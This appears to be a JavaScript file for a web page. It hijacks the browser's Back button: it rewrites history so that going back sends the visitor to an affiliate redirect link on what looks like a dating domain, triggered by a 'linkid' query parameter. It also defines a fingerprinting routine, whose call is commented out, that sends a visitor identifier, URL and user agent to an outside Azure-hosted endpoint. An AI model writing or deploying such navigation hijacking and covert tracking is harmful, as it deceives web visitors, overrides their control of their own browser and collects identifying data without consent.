function detectMob() {
  return ( ( window.innerWidth <= 800 ) && ( window.innerHeight <= 600 ) );
}
function getLinkId() {
    return new URLSearchParams(window.location.search).get("linkid");
}

function winLoad(callback) {
    if (document.readyState === 'complete') {
        callback();
    } else {
        window.addEventListener("load", callback);
    }
}

function fingerprint() {
    // fingerpring function
    try {
        const fpPromise = import('https://fpjscdn.net/v3/Gqu62M97wcRUBu1Yp8rS')
            .then(FingerprintJS => FingerprintJS.load())
        fpPromise
            .then(fp => fp.get())
            .then(async result => {
                // This is the visitor identifier:
                const visitorId = result.visitorId
                const obj = {
                    fingerprint: visitorId,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    device: detectMob() ? 1 : 0, // 0 - desctop, 1 - mobile
                    date: new Date().toISOString(),
                }
                fetch('https://datasystem.azurewebsites.net/fingerprints/push', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(obj)
                }).then(res => res);
                //fetch('https://datasystem.azurewebsites.net/visits/redirect', {
                //    method: 'POST',
                //    headers: {
                //        'Content-Type': 'application/json'
                //    },
                //    body: JSON.stringify({
                //        fingerprint: visitorId
                //    })
                //}).then(async res => {
                //    const jsoned = await res.json();
                //    if (jsoned.domain) {
                //        const url = `https://${jsoned.domain}${window.location.search ? `${window.location.search}&` : '?'}fp=${visitorId}`;
                //        // console.log(url);
                //        // window.location.replace(`${url}`)
                //    }
                //});
            })
            .catch(error => console.error(error))

    } catch (d) { }
}

winLoad(async function () {
    //if (location.host.indexOf('azurewebsites.net') < 0)
    //    return;
    var redirectUrl = '';
    
    var linkId = getLinkId();

    if (linkId) {
        if (linkId == 'taboola')
            return;
        else {
            redirectUrl = 'https://rgwkeb.iadysdates.net/c/b5c00ce7a72f712f?s1=148804&s2=1365947&j1=1&j9=1';
        }
    }
    else
        return;
    //fingerprint();
    // Back function
    var queryString = window.location.search;
    var numberOfCountsToReplace = 15;

    history.replaceState(null, document.title, location.pathname + "#!/history");
    history.pushState(null, document.title, location.pathname + queryString);

    var events = ["mouseup", "keydown", "scroll", "mousemove"];

    var actionCounts = 0;

    events.forEach(function (e) {
        document.addEventListener(e, function () {
            if (e === "mouseup") {
                actionCounts++;
            }
            //else if (e === "keydown") {
            //    actionCounts++;
            //}
            //else if (e === "scroll") {
            //    actionCounts++;
            //}
            if (actionCounts >= numberOfCountsToReplace) {
                window.onpopstate = () => {
                    history.back();
                };
            }
        });
    });

    window.onpopstate = () => {
        setTimeout(() => {
            if (location.hash === "#!/history") {
                location.replace(redirectUrl);
            }
        }, 0);
    }

    

});
